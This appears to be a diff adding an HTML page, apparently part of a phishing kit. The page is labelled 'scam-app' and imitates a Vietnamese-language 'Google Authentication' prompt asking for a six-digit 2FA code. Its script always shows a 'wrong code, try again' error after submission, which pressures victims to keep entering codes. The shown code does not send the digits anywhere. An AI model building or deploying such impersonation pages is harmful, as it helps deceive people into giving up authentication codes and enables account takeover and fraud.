@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.1/css/all.css"
+        integrity="sha384-O8whS3fhG2OnA5Kas0Y9l3cfpmYjapjI0E4theH4iuMD+pLhbf6JI0jIMfYcK3yZ" crossorigin="anonymous" />
+    <style>
+        body {
+            /* background-image: url("fake.png"); */
+            background-color: #060642;
+            color: white;
+            font-family: "helvetica", "sans-serif";
+        }
+
+        .my-form {
+            color: #868f93 !important;
+        }
+
+        .my-tb {
+            background-color: #060642;
+            border-color: #40406e;
+            border-radius: 8px;
+        }
+
+        #form-authen input {
+            width: 40px;
+            height: 40px;
+            border-radius: 5px;
+            border-color: #40406e;
+            background-color: #060642;
+            color: white;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="scam-app">
+        <div id="warning" style="display: none;" class="alert alert-danger alert-dismissible fade show">
+            <button id='close-alert' class='close' type="button">&times;</button>
+            Mã xác thực Google sai. Vui lòng thử lại!
+        </div>
+        <div class="container" style="width:254px">
+
+            <img style="margin-top: 30px; width:224px;" src="main-icon.png" />
+
+
+            <h2 style="
+              font-size: 1.5rem !important;
+              font-weight: 700 !important;
+              font-family: inherit;
+              line-height: 1.2;
+              margin-top: 40px;
+              margin-bottom: 30px;
+            ">
+                Bảo mật Google Authentication
+            </h2>
+
+
+            <div class="form-group my-form">
+                <!-- <label for="username">Địa chỉ Email *</label>
+    <input type="text" class="form-control my-tb" name="" id="username" aria-describedby="helpId" placeholder="Điền Email" /> -->
+                <label for="username">Mã Google Authentication</label>
+                <div class="d-flex justify-content-between align-items-center" id="form-authen">
+                    <input class='code' id='n-1' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-2')" />
+                    <input class='code' id='n-2' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-3')" />
+                    <input class='code' id='n-3' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-4')" />
+                    <input class='code' id='n-4' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-5')" />
+                    <input class='code' id='n-5' type="text" maxlength="1" onkeypress="return isNumberKey(event, 'n-6')" />
+                    <input class='code' id='n-6' type="text" maxlength="1" onkeypress="return isNumberKey(event)" />
+
+
+                </div>
+            </div>
+
+            <button data-toggle="modal" data-target="#myModal" id="btn-authen"
+                style="width: 224px; height: 47px; margin-top:20px" type="button" class="btn btn-primary">
+                Gửi
+            </button>
+
+
+        </div>
+    </div>
+
+
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+        crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+        crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+        crossorigin="anonymous"></script>
+
+    <!-- Optional JavaScript -->
+    <script>
+        // $(document).ready(function () {
+          
+           
+          
+
+        //         $('.code').bind("keypress", function (evt) {
+        //             var charCode = (evt.which) ? evt.which : evt.keyCode
+        //             if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+        //                 return false;
+        //             }
+
+        //             // if (index < 6) {
+        //             //     codes[index].focus();
+        //             // }
+        //             $('#' + target).focus();
+        //             return true;
+        //         })
+           
+
+        // });
+        function isNumberKey(evt, target) {
+            var charCode = (evt.which) ? evt.which : evt.keyCode
+            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+                return false;
+            }
+            console.log(target)
+            if(target != null){
+                document.getElementById(target).focus();
+            }
+            
+            return true;
+        }
+
+        $('#btn-authen').click(function (e) {
+
+            $('#warning').css('display', 'block');
+
+        });
+
+        $("#close-alert")[0].onclick = null;
+
+        $('#close-alert').click(function (e) {
+            $('#warning').css('display', 'none');
+
+        });
+    </script>
+</body>
+
+</html>
